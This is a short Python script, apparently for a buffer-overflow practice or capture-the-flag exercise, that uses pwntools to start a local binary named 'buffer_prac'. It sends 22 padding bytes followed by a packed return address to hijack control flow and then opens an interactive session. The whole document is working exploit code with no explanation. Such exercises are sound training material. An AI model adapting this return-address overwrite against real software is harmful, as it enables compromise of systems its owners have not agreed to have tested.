from pwn import *

p = process('./buffer_prac')

p.sendlineafter(b'?\n', b'32')

p.sendlineafter(b'y\\n', b'A' * 22 + p32(0x8048626))

p.interactive()
p.close()
